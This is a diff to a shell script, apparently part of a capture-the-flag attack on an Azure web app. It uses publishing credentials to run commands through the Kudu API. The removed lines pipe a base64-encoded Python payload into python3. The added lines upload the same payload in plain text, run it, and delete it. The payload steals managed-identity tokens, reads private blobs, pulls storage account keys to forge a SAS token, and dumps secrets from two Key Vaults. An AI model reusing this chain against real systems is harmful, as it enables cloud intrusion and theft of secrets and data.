@@ -11,10 +11,62 @@ curl -s -X POST -H "Authorization: Bearer $MG" -H 'Content-Length: 0' "https://m
 U=$(jq -r '.properties.publishingUserName' /tmp/pc.json); P=$(jq -r '.properties.publishingPassword' /tmp/pc.json)
 BA=$(printf '%s:%s' "$U" "$P" | base64 | tr -d '\n')
 for i in 1 2 3 4 5 6; do C=$(curl -s -m 60 -o /dev/null -w '%{http_code}' -H "Authorization: Basic $BA" "$SCM/api/settings"); echo "scm warm $i: $C"; [ "$C" = "200" ] && break; sleep 5; done
-PY64="aW1wb3J0IG9zLGpzb24sdXJsbGliLnJlcXVlc3QsdXJsbGliLnBhcnNlLGJhc2U2NCxobWFjLGhhc2hsaWIscmUKaWU9b3MuZW52aXJvbi5nZXQoIklERU5USVRZX0VORFBPSU5UIiwiIik7IGloPW9zLmVudmlyb24uZ2V0KCJJREVOVElUWV9IRUFERVIiLCIiKQpDSUQ9IjdhODUxNTZhLTAxYzQtNGU2MS04NDcyLTQwYTkyMTA3MTU5YiIKU1VCPSJjNWU0ZTAwNC1iNDJkLTRhYzQtYTUwMi01ZmQzMzgzODBlYjYiOyBSRz0icmctdGJsLXBsYXRmb3JtLXByb2Qtc2VhIjsgQUNDPSJzdHRibGFwcGNmZ3Byb2R4M2V1b3oiCmRlZiB0b2socmVzKToKICAgIHU9aWUrIj9yZXNvdXJjZT0iK3VybGxpYi5wYXJzZS5xdW90ZShyZXMsc2FmZT0iIikrIiZhcGktdmVyc2lvbj0yMDE5LTA4LTAxJmNsaWVudF9pZD0iK0NJRAogICAgdHJ5OiByZXR1cm4ganNvbi5sb2Fkcyh1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodSxoZWFkZXJzPXsiWC1JREVOVElUWS1IRUFERVIiOmlofSksdGltZW91dD0yNSkucmVhZCgpKS5nZXQoImFjY2Vzc190b2tlbiIsIiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgdHJ5OiByZXR1cm4gIkVSUjoiK2UucmVhZCgpLmRlY29kZSgpWzoxNTBdCiAgICAgICAgZXhjZXB0OiByZXR1cm4gIkVSUjoiK3N0cihlKVs6MTUwXQpkZWYgcmVxKHUsaCxtZXRob2Q9IkdFVCIsZGF0YT1Ob25lKToKICAgIHRyeToKICAgICAgICByPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodSxoZWFkZXJzPWgsbWV0aG9kPW1ldGhvZCxkYXRhPWRhdGEpCiAgICAgICAgcmV0dXJuIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocix0aW1lb3V0PTI1KS5yZWFkKCkuZGVjb2RlKCJ1dGYtOCIsInJlcGxhY2UiKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHRyeTogcmV0dXJuICJFUlIlczolcyIlKGdldGF0dHIoZSwnY29kZScsJz8nKSxlLnJlYWQoKS5kZWNvZGUoInV0Zi04IiwicmVwbGFjZSIpWzozMDBdKQogICAgICAgIGV4Y2VwdDogcmV0dXJuICJFUlI6IitzdHIoZSlbOjIwMF0KT1VUPXsiaWVfcHJlc2VudCI6Ym9vbChpZSksImloX2xlbiI6bGVuKGloKX0KT1VUWyJlbnZmbGFnIl09WyAoayx2KSBmb3Igayx2IGluIG9zLmVudmlyb24uaXRlbXMoKSBpZiAiREYyNnsiIGluIHN0cih2KSBdCiMgMSkgc3RvcmFnZSBkYXRhLXBsYW5lIGRpcmVjdCBibG9iIHJlYWQKc3Q9dG9rKCJodHRwczovL3N0b3JhZ2UuYXp1cmUuY29tLyIpOyBPVVRbInN0Il09c3RbOjEyXQppZiBzdCBhbmQgbm90IHN0LnN0YXJ0c3dpdGgoIkVSUiIpOgogICAgT1VUWyJibG9iX2RpcmVjdCJdPXJlcSgiaHR0cHM6Ly8lcy5ibG9iLmNvcmUud2luZG93cy5uZXQvY29uZmlnL2ludGVybmFsLWNvbmZpZy5qc29uIiVBQ0MseyJBdXRob3JpemF0aW9uIjoiQmVhcmVyICIrc3QsIngtbXMtdmVyc2lvbiI6IjIwMjEtMDgtMDYifSlbOjgwMF0KICAgIE9VVFsiY29udGFpbmVycyJdPXJlLmZpbmRhbGwociI8TmFtZT4oW148XSspPC9OYW1lPiIsIHJlcSgiaHR0cHM6Ly8lcy5ibG9iLmNvcmUud2luZG93cy5uZXQvP2NvbXA9bGlzdCIlQUNDLHsiQXV0aG9yaXphdGlvbiI6IkJlYXJlciAiK3N0LCJ4LW1zLXZlcnNpb24iOiIyMDIxLTA4LTA2In0pKQojIDIpIG1hbmFnZW1lbnQgbGlzdEtleXMgLT4gU0FTIC0+IGJsb2IKbWc9dG9rKCJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIpOyBPVVRbIm1nIl09bWdbOjEyXQppZiBtZyBhbmQgbm90IG1nLnN0YXJ0c3dpdGgoIkVSUiIpOgogICAga3I9cmVxKCJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tL3N1YnNjcmlwdGlvbnMvJXMvcmVzb3VyY2VHcm91cHMvJXMvcHJvdmlkZXJzL01pY3Jvc29mdC5TdG9yYWdlL3N0b3JhZ2VBY2NvdW50cy8lcy9saXN0S2V5cz9hcGktdmVyc2lvbj0yMDIzLTA1LTAxIiUoU1VCLFJHLEFDQykseyJBdXRob3JpemF0aW9uIjoiQmVhcmVyICIrbWcsIkNvbnRlbnQtTGVuZ3RoIjoiMCJ9LCJQT1NUIikKICAgIHRyeToga2V5PWpzb24ubG9hZHMoa3IpWyJrZXlzIl1bMF1bInZhbHVlIl07IE9VVFsibGlzdEtleXMiXT0iT0siCiAgICBleGNlcHQgRXhjZXB0aW9uOiBrZXk9Tm9uZTsgT1VUWyJsaXN0S2V5cyJdPWtyWzoyMDBdCiAgICBpZiBrZXk6CiAgICAgICAgc3Y9IjIwMjEtMDgtMDYiOyBzdHM9IlxuIi5qb2luKFtBQ0MsInJsIiwiYiIsInNjbyIsIjIwMjYtMTAtMjFUMDA6MDA6MDBaIiwiMjAyNi0xMC0yNFQwMDowMDowMFoiLCIiLCJodHRwcyIsc3YsIiJdKSsiXG4iCiAgICAgICAgc2lnPWJhc2U2NC5iNjRlbmNvZGUoaG1hYy5uZXcoYmFzZTY0LmI2NGRlY29kZShrZXkpLHN0cy5lbmNvZGUoKSxoYXNobGliLnNoYTI1NikuZGlnZXN0KCkpLmRlY29kZSgpCiAgICAgICAgc2FzPXVybGxpYi5wYXJzZS51cmxlbmNvZGUoeyJzdiI6c3YsInNzIjoiYiIsInNydCI6InNjbyIsInNwIjoicmwiLCJzdCI6IjIwMjYtMTAtMjFUMDA6MDA6MDBaIiwic2UiOiIyMDI2LTEwLTI0VDAwOjAwOjAwWiIsInNwciI6Imh0dHBzIiwic2lnIjpzaWd9KQogICAgICAgIE9VVFsiY2ZnX2Jsb2JzIl09cmUuZmluZGFsbChyIjxOYW1lPihbXjxdKyk8L05hbWU+IiwgcmVxKCJodHRwczovLyVzLmJsb2IuY29yZS53aW5kb3dzLm5ldC9jb25maWc/cmVzdHlwZT1jb250YWluZXImY29tcD1saXN0JiVzIiUoQUNDLHNhcykse30pKQogICAgICAgIE9VVFsiaW50ZXJuYWxfY29uZmlnIl09cmVxKCJodHRwczovLyVzLmJsb2IuY29yZS53aW5kb3dzLm5ldC9jb25maWcvaW50ZXJuYWwtY29uZmlnLmpzb24/JXMiJShBQ0Msc2FzKSx7fSlbOjgwMF0KIyAzKSB2YXVsdCAtPiBrdi10Ymwtc2VjICsga3YtdGJsLXByb2QKdnQ9dG9rKCJodHRwczovL3ZhdWx0LmF6dXJlLm5ldC8iKTsgT1VUWyJ2dCJdPXZ0WzoxMl0KaWYgdnQgYW5kIG5vdCB2dC5zdGFydHN3aXRoKCJFUlIiKToKICAgIGZvciBrdiBpbiAoImt2LXRibC1zZWMteDNldW96Iiwia3YtdGJsLXByb2QteDNldW96Iik6CiAgICAgICAgZD1yZXEoImh0dHBzOi8vJXMudmF1bHQuYXp1cmUubmV0L3NlY3JldHM/YXBpLXZlcnNpb249Ny40IiVrdix7IkF1dGhvcml6YXRpb24iOiJCZWFyZXIgIit2dH0pCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZHM9W3NbImlkIl0gZm9yIHMgaW4ganNvbi5sb2FkcyhkKS5nZXQoInZhbHVlIixbXSldOyBPVVRba3ZdPWlkcwogICAgICAgICAgICBmb3IgaSBpbiBpZHM6CiAgICAgICAgICAgICAgICBPVVRba3YrIjo6IitpLnNwbGl0KCIvIilbLTFdXT1yZXEoaSsiP2FwaS12ZXJzaW9uPTcuNCIseyJBdXRob3JpemF0aW9uIjoiQmVhcmVyICIrdnR9KVs6MzAwXQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246IE9VVFtrdl09ZFs6MjAwXQpwcmludCgiVEJMUkVTVUxUPSIranNvbi5kdW1wcyhPVVQpKQo="
-echo "### MSI->flag via kudu command (bash -lc)"
-RESP=$(curl -s -m 110 -X POST -H "Authorization: Basic $BA" -H "Content-Type: application/json" "$SCM/api/command"   -d "{\"command\":\"bash -lc 'echo $PY64 | base64 -d | python3'\",\"dir\":\"site/wwwroot\"}")
-echo "OUTPUT:";  echo "$RESP" | jq -r '.Output' 2>/dev/null | grep -aoE 'TBLRESULT=.*' | head -1
-echo "EXIT:";    echo "$RESP" | jq -r '.ExitCode' 2>/dev/null
-echo "ERR:";     echo "$RESP" | jq -r '.Error' 2>/dev/null | head -c 500
+# decode exploit in the CI runner (reliable), upload via VFS to /home (outside wwwroot)
+cat > /tmp/mf.py <<'PYEOF'
+import os,json,urllib.request,urllib.parse,base64,hmac,hashlib,re
+ie=os.environ.get("IDENTITY_ENDPOINT",""); ih=os.environ.get("IDENTITY_HEADER","")
+CID="7a85156a-01c4-4e61-8472-40a92107159b"
+SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"; RG="rg-tbl-platform-prod-sea"; ACC="sttblappcfgprodx3euoz"
+def tok(res):
+    u=ie+"?resource="+urllib.parse.quote(res,safe="")+"&api-version=2019-08-01&client_id="+CID
+    try: return json.loads(urllib.request.urlopen(urllib.request.Request(u,headers={"X-IDENTITY-HEADER":ih}),timeout=25).read()).get("access_token","")
+    except Exception as e:
+        try: return "ERR:"+e.read().decode()[:150]
+        except: return "ERR:"+str(e)[:150]
+def req(u,h,method="GET",data=None):
+    try:
+        r=urllib.request.Request(u,headers=h,method=method,data=data)
+        return urllib.request.urlopen(r,timeout=25).read().decode("utf-8","replace")
+    except Exception as e:
+        try: return "ERR%s:%s"%(getattr(e,'code','?'),e.read().decode("utf-8","replace")[:300])
+        except: return "ERR:"+str(e)[:200]
+OUT={"ie_present":bool(ie),"ih_len":len(ih)}
+OUT["envflag"]=[ (k,v) for k,v in os.environ.items() if "DF26{" in str(v) ]
+# 1) storage data-plane direct blob read
+st=tok("https://storage.azure.com/"); OUT["st"]=st[:12]
+if st and not st.startswith("ERR"):
+    OUT["blob_direct"]=req("https://%s.blob.core.windows.net/config/internal-config.json"%ACC,{"Authorization":"Bearer "+st,"x-ms-version":"2021-08-06"})[:800]
+    OUT["containers"]=re.findall(r"<Name>([^<]+)</Name>", req("https://%s.blob.core.windows.net/?comp=list"%ACC,{"Authorization":"Bearer "+st,"x-ms-version":"2021-08-06"}))
+# 2) management listKeys -> SAS -> blob
+mg=tok("https://management.azure.com/"); OUT["mg"]=mg[:12]
+if mg and not mg.startswith("ERR"):
+    kr=req("https://management.azure.com/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s/listKeys?api-version=2023-05-01"%(SUB,RG,ACC),{"Authorization":"Bearer "+mg,"Content-Length":"0"},"POST")
+    try: key=json.loads(kr)["keys"][0]["value"]; OUT["listKeys"]="OK"
+    except Exception: key=None; OUT["listKeys"]=kr[:200]
+    if key:
+        sv="2021-08-06"; sts="\n".join([ACC,"rl","b","sco","2026-10-21T00:00:00Z","2026-10-24T00:00:00Z","","https",sv,""])+"\n"
+        sig=base64.b64encode(hmac.new(base64.b64decode(key),sts.encode(),hashlib.sha256).digest()).decode()
+        sas=urllib.parse.urlencode({"sv":sv,"ss":"b","srt":"sco","sp":"rl","st":"2026-10-21T00:00:00Z","se":"2026-10-24T00:00:00Z","spr":"https","sig":sig})
+        OUT["cfg_blobs"]=re.findall(r"<Name>([^<]+)</Name>", req("https://%s.blob.core.windows.net/config?restype=container&comp=list&%s"%(ACC,sas),{}))
+        OUT["internal_config"]=req("https://%s.blob.core.windows.net/config/internal-config.json?%s"%(ACC,sas),{})[:800]
+# 3) vault -> kv-tbl-sec + kv-tbl-prod
+vt=tok("https://vault.azure.net/"); OUT["vt"]=vt[:12]
+if vt and not vt.startswith("ERR"):
+    for kv in ("kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"):
+        d=req("https://%s.vault.azure.net/secrets?api-version=7.4"%kv,{"Authorization":"Bearer "+vt})
+        try:
+            ids=[s["id"] for s in json.loads(d).get("value",[])]; OUT[kv]=ids
+            for i in ids:
+                OUT[kv+"::"+i.split("/")[-1]]=req(i+"?api-version=7.4",{"Authorization":"Bearer "+vt})[:300]
+        except Exception: OUT[kv]=d[:200]
+print("TBLRESULT="+json.dumps(OUT))
+PYEOF
+echo "mf.py lines: $(wc -l < /tmp/mf.py)"
+echo "VFS PUT -> $(curl -s -o /dev/null -w '%{http_code}' -X PUT --data-binary @/tmp/mf.py -H "If-Match: *" -H "Authorization: Basic $BA" "$SCM/api/vfs/home/zzcl_mf.py")"
+echo "### run it"
+RESP=$(curl -s -m 110 -X POST -H "Authorization: Basic $BA" -H "Content-Type: application/json" "$SCM/api/command" -d '{"command":"python3 /home/zzcl_mf.py","dir":"site/wwwroot"}')
+echo "$RESP" | jq -r '.Output' 2>/dev/null | grep -aoE 'TBLRESULT=.*' | head -1 > /tmp/res.txt
+if [ -s /tmp/res.txt ]; then echo "GOT RESULT:"; cat /tmp/res.txt; else echo "no TBLRESULT; raw:"; echo "$RESP" | jq -r '{ExitCode,Error,Output}' 2>/dev/null | head -c 1500; fi
+# cleanup
+curl -s -o /dev/null -w 'VFS DELETE -> %{http_code}\n' -X DELETE -H "If-Match: *" -H "Authorization: Basic $BA" "$SCM/api/vfs/home/zzcl_mf.py"
 echo "=== DONE ==="
